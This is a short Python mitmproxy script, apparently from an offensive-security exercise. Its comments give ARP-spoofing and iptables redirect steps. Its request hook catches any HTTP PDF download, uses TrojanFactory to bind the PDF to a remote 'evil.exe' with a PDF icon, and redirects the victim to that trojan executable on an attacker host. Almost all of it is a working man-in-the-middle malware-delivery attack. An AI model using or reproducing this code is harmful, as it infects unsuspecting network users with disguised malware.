import mitmproxy
import subprocess

# ./mitmproxy -s mitmproxy_replace_pdf.py -m transparent
# Do ARP spoofing ettercap or bettercap or arpspoof
# ./mitmproxy -s mitmproxy_replace_pdf.py -m transparent
# iptables -r nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# will replace on the fly 


# pull repo for making trojan and put it in /opt
# https://github.com/z00z/TrojanFactory.git 
# mitm custom scripts https://github.com/mitmproxy/mitmproxy/tree/v2.0.2/examples/complex

# https://github.com/z00z/TrojanFactory/blob/master/mitmproxy_script.py 
#1. Proper implementation of Tojan Factory.
#2. Supports multiple file types.
#3. Spoof file extension on the fly.
#4. Add an appropriate icon on the fly.

def request(flow):
	
	if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf"):
		print("[+] Got interesting flow")
		
		front_file = flow.request.pretty_url + "#"
		subprocess.call("python /opt/TrojanFactory/tronjan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe# -o /var/www/html/file.exe -i /root/Downloads/pdf.ico", shell=True)
		
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://192.168.138.118/file.exe"})
	
